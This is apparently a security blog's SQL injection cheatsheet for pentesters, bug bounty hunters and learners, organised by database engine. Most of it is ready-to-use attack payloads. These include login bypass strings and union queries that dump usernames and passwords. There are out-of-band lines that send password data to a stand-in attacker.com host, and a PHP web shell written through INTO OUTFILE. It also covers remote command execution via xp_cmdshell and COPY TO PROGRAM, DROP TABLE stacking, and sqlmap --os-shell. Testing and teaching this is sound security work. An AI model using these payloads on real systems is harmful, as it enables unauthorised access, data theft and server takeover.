---
title: "SQL Injection Cheatsheet"
pubDate: 2025-07-09
description: "Common payloads for SQL Injection"
tags: ["sqli", "cheatsheet"]
---


# SQLi Cheatsheet

SQL Injection (SQLi) remains one of the most dangerous and widely exploited web vulnerabilities - even decades after its discovery. Despite countless defenses and awareness campaigns, improperly sanitized inputs still lead to critical breaches across modern web applications, APIs, and even mobile backends.

This **comprehensive SQLi cheatsheet** is a go-to reference for:

- Bug bounty hunters
- Web app pentesters
- CTF participants
- Security researchers
- Developers aiming to understand and defend against SQLi

It covers everything from **basic discovery** and **fingerprinting** to **blind injection**, **bypass tricks**, **out-of-band exfiltration**, and even **SQLi-to-RCE escalations** — all categorized per **DBMS (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)** with example payloads.

## Table of Contents

## Table of Contents

1. [Initial Tests (Discovery Phase)](#initial-tests-discovery-phase)
2. [Comment Syntax per DBMS](#comment-syntax-per-dbms)
3. [Substring Extraction](#substring-extraction)
4. [String Concatenation](#string-concatenation)
5. [Database Fingerprinting](#database-fingerprinting)
6. [Conditional Errors (Boolean Trigger)](#conditional-errors-boolean-trigger)
7. [Error-Based Data Leakage](#error-based-data-leakage)
8. [Detecting Number of Columns](#detecting-number-of-columns)
9. [Discovering Injectable Columns](#discovering-injectable-columns)
10. [Group_Concat Usage](#group_concat-usage)
11. [Detecting WAF Presence](#detecting-waf-presence)
12. [Extracting DB Info](#extracting-db-info)
13. [Login Bypass Payloads](#login-bypass-payloads)
14. [Time-Based SQLi (Blind)](#time-based-sqli-blind)
15. [Timing-Based Data Extraction via Bitwise Operations](#timing-based-data-extraction-via-bitwise-operations)
16. [Blind Boolean-Based Automation Logic](#blind-boolean-based-automation-logic)
17. [Out-of-Band (OOB) SQLi](#out-of-band-oob-sqli)
18. [DNS Lookup (Out-of-Band)](#dns-lookup-out-of-band)
19. [DNS Lookup with Data Exfiltration](#dns-lookup-with-data-exfiltration)
20. [Second-Order SQLi Example](#second-order-sqli-example)
21. [Bypass Techniques](#bypass-techniques)
22. [SQLi in Other Contexts](#sqli-in-other-contexts)
23. [Detection Techniques](#detection-techniques)
24. [Payload Bank](#payload-bank)
25. [Other Payload Types](#other-payload-types)
26. [Database Permissions Enumeration](#database-permissions-enumeration)
27. [SQLi → LFI (Local File Inclusion)](#sqli--lfi-local-file-inclusion)
28. [SQLi → File Write](#sqli--file-write)
29. [SQLi → RCE (Remote Code Execution)](#sqli--rce-remote-code-execution)
30. [Error Message Banners Enumeration (Non-Injection)](#error-message-banners-enumeration-non-injection)
31. [SQLite Specific Payloads](#sqlite-specific-payloads)
32. [Stored Procedure Abuse (MSSQL, MySQL)](#stored-procedure-abuse-mssql-mysql)
33. [PostgreSQL COPY Command with RCE](#postgresql-copy-command-with-rce)
34. [Tools & Automation](#tools--automation)
35. [Other Useful SQLi Tools](#other-useful-sqli-tools)
36. [Fuzzing & Detection](#fuzzing--detection)
37. [Manual Testing Helpers](#manual-testing-helpers)
38. [Bypass & Tampering Tools](#bypass--tampering-tools)
39. [Payload Repositories & Test Sets](#payload-repositories--test-sets)
40. [Practice Labs to Try](#practice-labs-to-try)
41. [Tips](#tips)

### **Initial Tests (Discovery Phase)**

| Action | Payload / Example | Notes |
| --- | --- | --- |
| Basic test for SQLi | `'` or `"` or `;--` | Look for errors or behavior change |
| Comment rest of query | `' --`  or `"#` or `' /*` | Comments vary by DB |
| Numeric test | `1 OR 1=1` | Works if param is numeric |
| String test | `' OR 'a'='a` | Tests injection into string context |
| Time-based test | `' OR SLEEP(5)--` | Useful in Blind SQLi |
| Boolean test | `' AND 1=1 --` vs `' AND 1=2 --` | Helps confirm Blind SQLi |
| Statement stacking | `1; DROP TABLE users; --` | Only in some DBs like MSSQL, PostgreSQL, not in MySQL by default |

### **Comment Syntax per DBMS**

| DBMS | Comment Syntax |
| --- | --- |
| MySQL | `--` , `#`, `/* */` |
| MSSQL | `--`, `/* */` |
| Oracle | `--`, `/* */` |
| PostgreSQL | `--`, `/* */` |
| SQLite | `--`, `/* */` |

Always add a **space** after `--` for MySQL.

### Substring Extraction

| DBMS | Syntax | Result for input `'foobar', 4, 2` → `ba` |
| --- | --- | --- |
| Oracle | `SUBSTR('foobar', 4, 2)` |  |
| Microsoft | `SUBSTRING('foobar', 4, 2)` |  |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |  |
| MySQL | `SUBSTRING('foobar', 4, 2)` |  |

### String Concatenation

| DBMS | Syntax |
| --- | --- |
| Oracle | `'foo'\|\|'bar’` |
| Microsoft | `'foo'+'bar'` |
| PostgreSQL | `'foo'\|\|'bar’` |
| MySQL | `'foo' 'bar'` or `CONCAT('foo','bar')` |

### **Database Fingerprinting (Version Detection)**

| DBMS | Query |
| --- | --- |
| **MySQL / MariaDB** | `SELECT @@version;` |
| **PostgreSQL** | `SELECT version();` |
| **Oracle** | `SELECT * FROM v$version;` |
| **Microsoft SQL Server (MSSQL)** | `SELECT @@version;` |
| **SQLite** | `SELECT sqlite_version();` |
| **IBM DB2** | `SELECT service_level FROM TABLE (sysproc.env_get_inst_info()) AS INSTANCEINFO;` |
| **Firebird** | `SELECT rdb$get_context('SYSTEM', 'ENGINE_VERSION') FROM rdb$database;` |
| **SAP HANA** | `SELECT * FROM "SYS"."M_DATABASE";` |
| **CockroachDB** | `SHOW CLUSTER SETTING version;` |
| **Amazon Redshift** | `SELECT version();` |
| **Teradata** | `SELECT * FROM DBC.DBCInfoV;` |
| **Informix** | `SELECT dbinfo('version', 'full') FROM systables WHERE tabid = 1;` |

### Conditional Errors (Boolean Trigger)

| DBMS | Example |
| --- | --- |
| Oracle | `SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| Microsoft | `SELECT CASE WHEN (condition) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1 = (SELECT CASE WHEN (condition) THEN 1/(SELECT 0) ELSE NULL END)` |
| MySQL | `SELECT IF(condition,(SELECT table_name FROM information_schema.tables),'a')` |

### Error-Based Data Leakage

| DBMS | Example |
| --- | --- |
| Microsoft | `SELECT 'foo' WHERE 1 = (SELECT 'secret')` → Conversion failed when converting varchar to int |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` → invalid input syntax for integer |
| MySQL | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))` → XPATH syntax error |

### **Detecting Number of Columns**

| Technique | Payload |
| --- | --- |
| ORDER BY | `' ORDER BY 1--` then `' ORDER BY 2--`... until error |
| UNION SELECT | `' UNION SELECT NULL--` then add `,NULL` until no error |

### **Discovering Injectable Columns**

```sql
' UNION SELECT 1,NULL--
' UNION SELECT NULL,2--
' UNION SELECT 1,2,3--
```

→ Replace `NULL` with strings or numbers to identify reflected output.

### Group_Concat

Helpful for extracting multiple rows in a single query.

```sql
SELECT GROUP_CONCAT(username, ':', password SEPARATOR ',') FROM users;
```

> Use with INFORMATION_SCHEMA:
> 

```sql
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database();
```

→ This is for MySQL only. Other databases have different functions

### **Detecting WAF Presence**

Sometimes WAFs block specific patterns. We can fingerprint them:

| Test | What it Indicates |
| --- | --- |
| `' AND 1=1--` vs `' AND 1=2--` | If both return same result → WAF |
| Encoded payload blocked | WAF may block `%27` |
| Delays blocked | Sleep functions might be filtered |

We can then **bypass** with encodings, obfuscation, or **time-based fuzzing**.

### **Extracting DB Info**

| Info | MySQL | PostgreSQL | Oracle | MSSQL |
| --- | --- | --- | --- | --- |
| Current DB | `SELECT database();` | `SELECT current_database();` | `SELECT ora_database_name FROM dual;` | `SELECT DB_NAME();` |
| Current User | `SELECT user();` | `SELECT user;` | `SELECT user FROM dual;` | `SELECT SYSTEM_USER;` |
| All DBs | `SELECT schema_name FROM information_schema.schemata;` | same | `SELECT name FROM v$database;` | `SELECT name FROM master..sysdatabases;` |
| All Tables | `SELECT table_name FROM information_schema.tables;` | same | `SELECT table_name FROM all_tables;` | `SELECT table_name FROM information_schema.tables;` |
| All Columns | `SELECT column_name FROM information_schema.columns WHERE table_name='users';` | same | `SELECT column_name FROM all_tab_columns WHERE table_name='USERS';` | same |

→ For Oracle, **`SELECT ora_database_name FROM dual;`** requires Oracle 12c+. For older versions, use **`SELECT name FROM v$database;`**

### **Login Bypass Payloads**

| Payload | Use |
| --- | --- |
| `' OR '1'='1'--` | Basic string-based bypass |
| `' OR 1=1--` | Numeric bypass |
| `' OR 'x'='x'--` | Blind bypass |
| `admin'--` | Bypass with known username |
| `' UNION SELECT 1, 'admin', 'password'--` | Bypass + inject data |
| `' OR 1=1 LIMIT 1 OFFSET 1--` | Limit result set |

### **Time-Based SQLi (Blind)**

| DBMS | Payload |
| --- | --- |
| MySQL | `SELECT SLEEP(10);` |
| PostgreSQL | `SELECT pg_sleep(10);` |
| MSSQL | `WAITFOR DELAY '0:0:10';` |
| Oracle | `dbms_pipe.receive_message(('a'),10)` |
|  |  |

**Conditional Delays**

| DBMS | Payload |
| --- | --- |
| MySQL | `SELECT IF(condition,SLEEP(10),'a');` |
| PostgreSQL | `SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END;` |
| MSSQL | `IF (condition) WAITFOR DELAY '0:0:10';` |
| Oracle | `SELECT CASE WHEN (condition) THEN dbms_pipe.receive_message('a',10) ELSE NULL END FROM dual;` |

### **Timing-Based Data Extraction via Bitwise Operations**

Very useful in Blind SQLi (character-by-character exfiltration):

```sql
' OR ASCII(SUBSTRING((SELECT database()),1,1)) = 115 AND SLEEP(5) --
```

→ Automated timing extraction scripts can be created from this pattern.

### **Blind Boolean-Based Automation Logic**

More structured loop for automation:

```sql
SELECT ASCII(SUBSTR((SELECT user()),1,1)) > 100
```

→ Can be used to binary search characters (faster).

### **Out-of-Band (OOB) SQLi**

| DBMS | Payload Example |
| --- | --- |
| MSSQL | `exec master..xp_dirtree '\\attacker.com\pwned'` |
| Oracle | `SELECT UTL_HTTP.REQUEST('http://attacker.com') FROM dual;` |
| PostgreSQL | `COPY (SELECT '') TO PROGRAM 'nslookup attacker.com';` |

Requires attacker-controlled server + Burp Collaborator / DNS log.

### DNS Lookup (Out-of-Band)

| DBMS | Payload |
| --- | --- |
| Oracle | `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
| MSSQL | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'` |
| PostgreSQL | `COPY (SELECT '') TO PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'` |
| MySQL | `LOAD_FILE('\\BURP-COLLABORATOR-SUBDOMAIN\a')` or `SELECT ... INTO OUTFILE '\\BURP-COLLABORATOR-SUBDOMAIN\a'` |

### DNS Lookup with Data Exfiltration

| DBMS | Payload |
| --- | --- |
| Oracle | SELECT UTL_HTTP.REQUEST('[http://attacker.com/?q='||](http://attacker.com/?q=%27%7C%7C)(SELECT password FROM users WHERE rownum=1)) FROM dual; |
| MSSQL | `DECLARE @p VARCHAR(1024); SET @p=(SELECT YOUR_QUERY); EXEC('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR/a"')` |
| PostgreSQL | Use plpgsql function with `COPY TO PROGRAM 'nslookup ...'` and dynamic execution |
| MySQL | `SELECT YOUR_QUERY INTO OUTFILE '\\BURP-COLLABORATOR-SUBDOMAIN\a'` (Windows only) |

> These techniques may require privileges and attacker-controlled DNS listener (e.g., Burp Collaborator).
> 

### **Second-Order SQLi Example**

1. Submit `username = '); DROP TABLE users; --`
2. Input is stored safely in DB
3. Later retrieved in unsafe query:
    
    ```sql
    SELECT * FROM logins WHERE username = '$stored_value';
    ```
    

→ Always check **both reflected and stored** flows.

### **Bypass Techniques**

| Method | Example |
| --- | --- |
| Case Swapping | `UnIoN SeLeCt` |
| Inline Comments | `UNI/**/ON SEL/**/ECT` |
| Hex Encoded | `0x41414141` |
| String Concatenation | `'UN' + 'ION SELECT'` |
| Whitespaces | `%0a`, `%09`, `%0b`, `%0c`, `+`, etc. |
| Encoding | Use `%27`, `%2F`, `%5C` |
| Char functions | `CHAR(65)+CHAR(66)` |

### **SQLi in Other Contexts**

1️⃣ **SQLi via JSON Body (API)**

```json
{
  "username": "' OR 1=1 --",
  "password": "abc"
}
```

> Use tools like Postman or Burp Repeater to test these endpoints.
> 

---

2️⃣ **SQLi in HTTP Headers**

```
User-Agent: ' OR '1'='1
Referer: ' OR 1=1 --
X-Forwarded-For: ' OR SLEEP(5) --
```

---

3️⃣ **SQLi in Cookies**

```
Cookie: sessionid=abc' OR '1'='1
```

---

4️⃣ **SQLi in URL Path**

```
/profile/1' AND 1=1 --/
/api/data/' UNION SELECT version() --/

```

---

5️⃣ **SQLi in GraphQL**

```json
{
  "query": "{ users(filter: \"' OR '1'='1\") { id name } }"
}
```

### Detection Techniques

| Technique | Description |
| --- | --- |
| Boolean Testing | Compare true vs false response |
| Time Delay | Use `SLEEP`, `WAITFOR DELAY`, `pg_sleep`, etc. |
| Error-Based | Trigger detailed error messages |
| Response Differentials | Slight layout/length changes |
| OOB DNS/HTTP | External call triggered on payload (blind but powerful) |

### **Payload Bank**

| Goal | Payload |
| --- | --- |
| Login bypass | `' OR 'a'='a'--` |
| Data exfil | `' UNION SELECT null, username, password FROM users--` |
| Time delay | `' OR SLEEP(10)--` |
| Error-based | `' AND 1=CONVERT(int, (SELECT @@version))--` |
| Boolean true | `' AND 1=1--` |
| Boolean false | `' AND 1=2--` |

### Other Payload Types

| Type | Example |
| --- | --- |
| Hex Injection | `' UNION SELECT 0x61646D696E, NULL--` |
| Unicode | `‘ OR 1=1 –` |
| Null Byte | `%00` (for old PHP/MySQL combos) |
| Timing Chain | `' OR IF(SUBSTRING(user(),1,1)='r', SLEEP(5), 0)--` |
| Bitwise | `1 |
| Subquery | `' AND (SELECT COUNT(*) FROM users) > 0 --` |

### **Database Permissions Enumeration**

Useful to test what we’re allowed to do (privilege escalation):

```sql
SELECT user(), current_user(), session_user(); -- varies by DBMS
SHOW GRANTS;
SELECT * FROM mysql.user; -- If possible

```

### SQLi → LFI (Local File Inclusion)

**PostgreSQL:**

```sql
UNION SELECT pg_read_file('/etc/passwd')
```

**MySQL (with secure_file_priv disabled):**

```sql
SELECT LOAD_FILE('/etc/passwd');
```

### SQLi → File Write

**MySQL:**

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

> ⚠️ Needs FILE permission + correct path
> 

**Advanced UNION-Based Exploits with File Write**

For exfil via web-accessible files:

```sql
UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'
```

> Already covered, but perhaps add:
> 
- MySQL’s `secure_file_priv` can block this
- Apache must have write permission

### SQLi → RCE (Remote Code Execution)

**MSSQL:**

```sql
EXEC xp_cmdshell 'whoami';
```

**PostgreSQL:**

```sql
COPY (SELECT '') TO PROGRAM 'id';
```

**Oracle (Java-based RCE):**

```sql
SELECT DBMS_JAVA.RUNJAVA('java.lang.Runtime.getRuntime().exec("cmd.exe")') FROM dual;
```

### **Error Message Banners Enumeration (Non-Injection)**

We can extract info from generic errors even without full injection.

- 500 Internal Server Error → App crash
- `ODBC SQL Server Driver` → MSSQL backend
- `PG::SyntaxError` → PostgreSQL backend
- `ORA-00933: SQL command not properly ended` → Oracle

### **SQLite Specific Payloads**

Often overlooked, but used in mobile/web apps:

```sql
SELECT sqlite_version();
SELECT name FROM sqlite_master WHERE type='table';
```

### **Stored Procedure Abuse (MSSQL, MySQL)**

Run OS commands or escalate:

- MSSQL:

```sql
EXEC master..xp_cmdshell 'whoami';
```

- MySQL (if enabled):

```sql
CALL sys_eval('id');
```

### **PostgreSQL COPY Command with RCE**

```sql
COPY (SELECT '') TO PROGRAM 'id';
```

> PostgreSQL-specific, but often unmonitored in internal systems.
> 

## Tools & Automation

### 1. **sqlmap**

Common usage:

```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
```

Advanced:

```bash
sqlmap -r request.txt --level=5 --risk=3 --batch --os-shell
```

Key features:

- Auto enumeration
- Dump tables, data
- Write/read files
- RCE on MSSQL/PostgreSQL

---

### 2. **Burp Suite**

- Use **Repeater** for manual payload tuning
- **Intruder** for fuzzing injection points
- **Logger++** to monitor headers
- Add extensions:
    - **SQLiPy**
    - **Backslash Powered Scanner**

---

### 3. **NoSQLMap (for MongoDB)**

```bash
python NoSQLMap.py -u http://target.com --dbs
```

## Other Useful SQLi Tools

### **Fuzzing & Detection**

| Tool | Description |
| --- | --- |
| **WFuzz** | Flexible web fuzzing tool that can brute-force SQLi points with payload lists |
| **ffuf** (Fast Fuzzer) | Super fast fuzzing for parameters, headers, and paths |
| **Nuclei** | Template-based vulnerability scanner — use community or custom templates to detect SQLi |
| **DalFox** | Primarily for XSS, but supports fuzzing HTTP parameters — helpful in chained attacks |

---

### **Manual Testing Helpers**

| Tool | Description |
| --- | --- |
| **Postman** | Test APIs for SQLi (especially JSON-based) |
| **httpie** | Command-line HTTP client, good for quick SQLi testing |
| **Insomnia** | GUI for REST APIs (like Postman) |
| **Mitmproxy** | Inspect/edit SQLi payloads in intercepted HTTP requests on the fly |

---

### **Bypass & Tampering Tools**

| Tool | Description |
| --- | --- |
| **NoSQLMap** | Automated MongoDB injection & enumeration tool |
| **SQLi Dumper** (Windows only) | GUI-based SQLi exploitation tool, often used in CTFs |
| **Havij** (Outdated/Windows) | GUI tool for automated SQLi (very beginner friendly but flagged by AV tools) |
| **TAMPERDATA** | Firefox extension to modify requests on the fly |
| **sqlninja** | Targets Microsoft SQL Server for SQLi + post-exploitation (incl. shell) |
| **BBQSQL** | Python-based blind SQLi framework — helps automate boolean/time-based attacks |

---

### **Payload Repositories & Test Sets**

| Tool / Resource | Description |
| --- | --- |
| **PayloadsAllTheThings** | GitHub repo with extensive SQLi payload lists |
| **SecLists** | Massive list of fuzzing payloads (SQLi, XSS, LFI, more) |
| **FuzzDB** | Payloads and error patterns for fuzzing SQLi and more |
| **SQLi-LABS** | Local lab environment with 65+ challenges |
| **Damn Vulnerable REST API (DVRA)** | REST-based app for practicing modern SQLi in APIs |

### Practice Labs to Try

| Platform | Focus |
| --- | --- |
| **PortSwigger Academy** | Structured SQLi Learning |
| **DVWA** | All security levels (Low, Med, High) |
| **bWAPP** | Realistic, deep variations |
| **Juice Shop** | Harder, logic-focused |
| **HackTheBox / TryHackMe** | Real CTF-style machines |
| **PentesterLab** | Solid theory + practice |

## Tips

- Always encode payloads properly for the context (URL, JSON, Headers)
- Use `LIMIT`, `OFFSET` to iterate rows if needed
- Always test POST, GET, Headers, and Cookies
- Second-order bugs may not show immediate effects — trace the flow
- Explore stacked queries (`; DROP TABLE users;--`) where supported
- Use prepared statements. Example:`cursor.execute("SELECT * FROM users WHERE username = %s", (username,))`

**Key takeaways:**

- Don’t rely solely on automated tools — manual testing and understanding application behavior is crucial.
- Always test in different contexts: GET, POST, cookies, headers, JSON bodies, GraphQL, and more.
- Stay mindful of WAF limitations and bypass techniques.
- Remember second-order injections and logic flaws can be just as dangerous.
- Above all — hack responsibly, ethically and with proper authorization.

**This cheatsheet is also available on my [GitHub](https://github.com/Bl0ss0mX5/Web-Vuln-Research/blob/main/SQLi/SQLi_Cheatsheet.md) — feel free to check it out, fork, or contribute!**
